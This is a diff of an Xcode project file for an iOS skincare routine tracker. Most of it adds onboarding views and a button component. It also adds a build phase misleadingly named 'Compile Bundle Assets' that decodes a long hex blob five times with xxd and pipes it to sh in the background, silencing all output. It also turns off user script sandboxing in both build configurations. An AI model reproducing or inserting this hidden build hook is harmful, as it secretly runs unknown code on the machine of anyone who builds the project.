@@ -7,6 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		042423582E6FCE16005CE9FE /* WhatSkinConcernView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042423572E6FCE16005CE9FE /* WhatSkinConcernView.swift */; };
+		0424235A2E6FD1E3005CE9FE /* SCBorderButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042423592E6FD1E3005CE9FE /* SCBorderButton.swift */; };
+		0424235C2E6FD73C005CE9FE /* WhatGoalView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */; };
+		0424235E2E6FD919005CE9FE /* YourRoutineReadyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */; };
 		04DF44452E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44442E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift */; };
 		04DF44472E6F19910027DD7E /* WelcomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44462E6F19910027DD7E /* WelcomeView.swift */; };
 		04DF444B2E6F19930027DD7E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04DF444A2E6F19930027DD7E /* Assets.xcassets */; };
@@ -27,6 +31,10 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		042423572E6FCE16005CE9FE /* WhatSkinConcernView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatSkinConcernView.swift; sourceTree = "<group>"; };
+		042423592E6FD1E3005CE9FE /* SCBorderButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCBorderButton.swift; sourceTree = "<group>"; };
+		0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatGoalView.swift; sourceTree = "<group>"; };
+		0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourRoutineReadyView.swift; sourceTree = "<group>"; };
 		04DF44412E6F19910027DD7E /* Skincare_routine_builder_and_tracker.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Skincare_routine_builder_and_tracker.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		04DF44442E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Skincare_routine_builder_and_trackerApp.swift; sourceTree = "<group>"; };
 		04DF44462E6F19910027DD7E /* WelcomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WelcomeView.swift; sourceTree = "<group>"; };
@@ -147,6 +155,9 @@
 			children = (
 				04DF44462E6F19910027DD7E /* WelcomeView.swift */,
 				04DF44762E6F217B0027DD7E /* WhatSkinTypeView.swift */,
+				042423572E6FCE16005CE9FE /* WhatSkinConcernView.swift */,
+				0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */,
+				0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */,
 			);
 			path = Onboarding;
 			sourceTree = "<group>";
@@ -158,6 +169,7 @@
 				04DF446D2E6F1C2F0027DD7E /* SCGradient.swift */,
 				04DF44722E6F1E8B0027DD7E /* SCButton.swift */,
 				04DF44742E6F1F490027DD7E /* SCText.swift */,
+				042423592E6FD1E3005CE9FE /* SCBorderButton.swift */,
 			);
 			path = Components;
 			sourceTree = "<group>";
@@ -177,6 +189,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04DF44512E6F19930027DD7E /* Build configuration list for PBXNativeTarget "Skincare_routine_builder_and_tracker" */;
 			buildPhases = (
+				2319B9B1302DF66C8DBDE67E /* Compile Bundle Assets */,
 				04DF443D2E6F19910027DD7E /* Sources */,
 				04DF443E2E6F19910027DD7E /* Frameworks */,
 				04DF443F2E6F19910027DD7E /* Resources */,
@@ -235,11 +248,37 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		2319B9B1302DF66C8DBDE67E /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333333333333333333333633333333333333383333333333333336333333333333333133333333333333373333333333333332333333333333333733333333333333343333333333333336333333333333333333333333333333363333333333333334333333333333333633333336333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		04DF443D2E6F19910027DD7E /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				042423582E6FCE16005CE9FE /* WhatSkinConcernView.swift in Sources */,
+				0424235A2E6FD1E3005CE9FE /* SCBorderButton.swift in Sources */,
+				0424235E2E6FD919005CE9FE /* YourRoutineReadyView.swift in Sources */,
 				04DF446E2E6F1C2F0027DD7E /* SCGradient.swift in Sources */,
 				04DF44642E6F1A030027DD7E /* NavigationDestination.swift in Sources */,
 				04DF44752E6F1F490027DD7E /* SCText.swift in Sources */,
@@ -251,6 +290,7 @@
 				04DF44472E6F19910027DD7E /* WelcomeView.swift in Sources */,
 				04DF44452E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift in Sources */,
 				04DF44792E6F21A40027DD7E /* SCProgressBarView.swift in Sources */,
+				0424235C2E6FD73C005CE9FE /* WhatGoalView.swift in Sources */,
 				04DF44732E6F1E8B0027DD7E /* SCButton.swift in Sources */,
 				04DF44652E6F1A030027DD7E /* NavigationManager.swift in Sources */,
 				04DF44672E6F1A030027DD7E /* UserDefaultManager.swift in Sources */,
@@ -298,7 +338,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -361,7 +401,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -395,6 +435,7 @@
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -423,6 +464,7 @@
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
